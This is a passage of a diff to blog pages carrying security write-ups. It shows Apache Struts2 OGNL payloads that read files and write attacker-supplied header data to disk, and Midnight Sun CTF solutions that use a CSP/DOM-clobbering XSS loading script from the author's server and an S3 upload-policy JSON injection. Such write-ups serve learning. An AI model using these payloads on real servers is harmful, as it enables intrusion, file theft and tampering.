 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The file names are stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;#o&lt;/code&gt;, then use the HTTP output primitive to print them over HTTP.&lt;/p&gt;
 
 &lt;h4 id=&quot;read-files-cat&quot;&gt;Read files (cat)&lt;/h4&gt;
 &lt;p&gt;Get the file as &lt;code class=&quot;highlighter-rouge&quot;&gt;ByteArray&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#f=new java.io.File('&amp;lt;file_to_read&amp;gt;')).(#o=@org.apache.commons.io.FileUtils@readFileToByteArray(#f))
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#f=new java.io.File(&apos;&amp;lt;file_to_read&amp;gt;&apos;)).(#o=@org.apache.commons.io.FileUtils@readFileToByteArray(#f))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Then use the &lt;code class=&quot;highlighter-rouge&quot;&gt;ByteArray&lt;/code&gt; HTTP output primitive to output the file.&lt;/p&gt;
@@ -453,13 +881,13 @@ java.lang.ClassLoader
 &lt;h4 id=&quot;get-current-directory-pwd&quot;&gt;Get current directory (pwd)&lt;/h4&gt;
 &lt;p&gt;This is a simple one:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#pwd = new java.io.File('.').getCanonicalPath()).(#o=#pwd)
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#pwd = new java.io.File(&apos;.&apos;).getCanonicalPath()).(#o=#pwd)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h4 id=&quot;write-file-using-a-custom-header&quot;&gt;Write file, using a custom header.&lt;/h4&gt;
 &lt;p&gt;This payload will get the file data stored in a custom header named &lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt; and write it to the desired file path and name.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('Data')).(#f=new java.io.FileWriter('&amp;lt;path to write&amp;gt;',true)).(#f.write(#data)).(#f.close())
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader(&apos;Data&apos;)).(#f=new java.io.FileWriter(&apos;&amp;lt;path to write&amp;gt;&apos;,true)).(#f.write(#data)).(#f.close())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;How about using Base64 to decode the &lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt; header and allow writing binary data? This is an exercise to the reader!&lt;/p&gt;
@@ -670,10 +1098,10 @@ Connection: close
 
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u are not admin, fak off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;u are not admin, fak off&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
@@ -700,7 +1128,7 @@ alert(1)
 
 &lt;p&gt;If you rememeber, we can reflect on the &lt;code class=&quot;highlighter-rouge&quot;&gt;content=&lt;/code&gt; attribute of the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, so: How about injecting other meta attributes? Like, for expample, &lt;code class=&quot;highlighter-rouge&quot;&gt;http-equiv&lt;/code&gt; which will let us to mimic a response header. At first, we think that maybe abusing XSS Auditor on filter mode (the default mode on latest Chrome browser versions) could help us on filtering the  &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; so we tried to inject &lt;code class=&quot;highlighter-rouge&quot;&gt;1&quot; http-equiv=&quot;X-XSS-Protection&quot; p=&quot;&lt;/code&gt;, but it doesn’t work, as the server was already setting an &lt;code class=&quot;highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; header, an headers always overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;http-quiv&lt;/code&gt; meta tag attribute.&lt;/p&gt;
 
-&lt;p&gt;Then, I realized that injecting a CSP policy constraining current domain scripts but allowing .jquery.com ones, could prevent &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; from loading, but jqeury will be allowed. Also, inline scripts and eval should be allowed, as jQuery bug is triggered beacuse an eval function. Injecting the following CSP header on the meta tag should do the job: &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &quot;&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&lt;/code&gt;. This worked!! Now Chrome is preventing &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;to load, as it comes from &lt;code class=&quot;highlighter-rouge&quot;&gt;http://marcololo-01.play.midnightsunctf.se:3001&lt;/code&gt; and CSP doesn’t allow this URL and also, doesn’t explicity allow &lt;code class=&quot;highlighter-rouge&quot;&gt;'self'&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then, I realized that injecting a CSP policy constraining current domain scripts but allowing .jquery.com ones, could prevent &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; from loading, but jqeury will be allowed. Also, inline scripts and eval should be allowed, as jQuery bug is triggered beacuse an eval function. Injecting the following CSP header on the meta tag should do the job: &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src &apos;unsafe-eval&apos; &apos;unsafe-inline&apos; *.jquery.com &quot;&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&lt;/code&gt;. This worked!! Now Chrome is preventing &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;to load, as it comes from &lt;code class=&quot;highlighter-rouge&quot;&gt;http://marcololo-01.play.midnightsunctf.se:3001&lt;/code&gt; and CSP doesn’t allow this URL and also, doesn’t explicity allow &lt;code class=&quot;highlighter-rouge&quot;&gt;&apos;self&apos;&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;But now, &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; doesn’t exists, as this object is not loaded anymore. This can be workarounded using the old friend, Dom Clobbering. If we also inject &lt;code class=&quot;highlighter-rouge&quot;&gt;id=name name=admin&lt;/code&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, javascript will be able to access &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; attribute, and it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;!!&lt;/p&gt;
 
@@ -708,7 +1136,7 @@ alert(1)
 
 &lt;p&gt;The final URL (without urlencode for legibility) is:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&quot; id=user name=admin p=&quot;#http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;/
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src &apos;unsafe-eval&apos; &apos;unsafe-inline&apos; *.jquery.com &amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&quot; id=user name=admin p=&quot;#http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;/
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;When submitting the flag on the initial form, it shows us the flag.&lt;/p&gt;
@@ -759,7 +1187,7 @@ alert(1)
 
 &lt;p&gt;The Cloudb challenge, from web cathegory, has the following statement:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;These guys made a DB in the cloud. Hope it's not a rain cloud...
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;These guys made a DB in the cloud. Hope it&apos;s not a rain cloud...
 
 Service:  [http://cloudb-01.play.midnightsunctf.se](http://cloudb-01.play.midnightsunctf.se/)
 
@@ -781,10 +1209,10 @@ Author: avlidienbrunn
 
 &lt;p&gt;The decoded base64:&lt;/p&gt;
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;expiration&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2019-04-06T14:17:03.000Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;conditions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-length-range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bucket&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cloudb-profilepics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;acl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;public-read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;expiration&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2019-04-06T14:17:03.000Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;conditions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-length-range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;bucket&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cloudb-profilepics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;acl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;public-read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;starts-with&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profilepics/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -803,11 +1231,11 @@ Author: avlidienbrunn
 &lt;p&gt;Also, the application lets us request our profile information, at &lt;code class=&quot;highlighter-rouge&quot;&gt;/userinfo/idiotsctf@idiots.com/info.json&lt;/code&gt; endpoint, returning the following JSON:&lt;/p&gt;
 
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profilepic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/profilepics/idiotsctf@idiots.com/ejemplo.jpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hmac&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;427881d9d33e2e619047bbaff90205a6c804524405d3574c8f4dfcabee162788&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf@idiots.com&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;profilepic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/profilepics/idiotsctf@idiots.com/ejemplo.jpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;hmac&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;427881d9d33e2e619047bbaff90205a6c804524405d3574c8f4dfcabee162788&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;idiotsctf@idiots.com&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -835,9 +1263,9 @@ Author: avlidienbrunn
   &lt;li&gt;Second, he was able to inject JSON strings on the &lt;code class=&quot;highlighter-rouge&quot;&gt;acl&lt;/code&gt; parameter. Let’s explain it:&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;A “common” query, could be &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read&lt;/code&gt;, this returns the above mentioned JSON (on Intro). Now, if we inject some strings, like this: &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read'} test&lt;/code&gt;, the base64 encoded policy acl looks like this:&lt;/p&gt;
+&lt;p&gt;A “common” query, could be &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read&lt;/code&gt;, this returns the above mentioned JSON (on Intro). Now, if we inject some strings, like this: &lt;code class=&quot;highlighter-rouge&quot;&gt;/signature?hmac=&amp;lt;hmac&amp;gt;&amp;amp;acl=public-read&apos;} test&lt;/code&gt;, the base64 encoded policy acl looks like this:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;... {'acl': 'public-read'}, test ...&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;... {&apos;acl&apos;: &apos;public-read&apos;}, test ...&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;We can inject things on the policy!!!&lt;/p&gt;
 
@@ -863,11 +1291,11 @@ Our team mate @HackingPatatas has an incredible ability to try random things and
 
 &lt;p&gt;A way to bypass, at least the &lt;code class=&quot;highlighter-rouge&quot;&gt;bucket&lt;/code&gt; restriction is adding another &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; JSON block. In JSON if the same key appears many times on the same level, the last is going to be the valid one. In this case, as the &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; directive appears before the user controlled &lt;code class=&quot;highlighter-rouge&quot;&gt;acl&lt;/code&gt; injectable parameter, we can inject something like this to invalidate the previous conditions:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public-read'}], 
-'conditions': [
-['starts-with', '$key', 'users/'],
-{'bucket':'cloudb-users'},
-{'acl':'public-read
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public-read&apos;}], 
+&apos;conditions&apos;: [
+[&apos;starts-with&apos;, &apos;$key&apos;, &apos;users/&apos;],
+{&apos;bucket&apos;:&apos;cloudb-users&apos;},
+{&apos;acl&apos;:&apos;public-read
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;See how we are closing the previous &lt;code class=&quot;highlighter-rouge&quot;&gt;condition&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;]&lt;/code&gt;, and opening a new one, with the &lt;code class=&quot;highlighter-rouge&quot;&gt;cloud-users&lt;/code&gt; as allowed bucket. This returned the error &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid according to Policy: Policy Condition failed: [&quot;starts-with&quot;, &quot;$key&quot;, &quot;profilepics/&quot;]&lt;/code&gt;&lt;/p&gt;
@@ -877,7 +1305,7 @@ Our team mate @HackingPatatas has an incredible ability to try random things and
 &lt;h3 id=&quot;the-magic-of-the-patata-again&quot;&gt;The magic of the patata… again.&lt;/h3&gt;
 &lt;p&gt;We need to find a way to invalidate the second &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with: profilepics/&lt;/code&gt; directive, we can do this by creating a new JSON block at the end of our injection, like this:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(our injection) ... ], 'new-block': [{'acl': 'public-read&lt;/code&gt;, so the second &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with&lt;/code&gt; is not going to be inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; block anymore. BUUUUUUT, we just can’t declare blocks with  names other than &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;expiration&lt;/code&gt; or we get an error like this &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid Policy: Unexpected: 'new-block'&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(our injection) ... ], &apos;new-block&apos;: [{&apos;acl&apos;: &apos;public-read&lt;/code&gt;, so the second &lt;code class=&quot;highlighter-rouge&quot;&gt;starts-with&lt;/code&gt; is not going to be inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; block anymore. BUUUUUUT, we just can’t declare blocks with  names other than &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;expiration&lt;/code&gt; or we get an error like this &lt;code class=&quot;highlighter-rouge&quot;&gt;Invalid Policy: Unexpected: &apos;new-block&apos;&lt;/code&gt;.&lt;/p&gt;
 
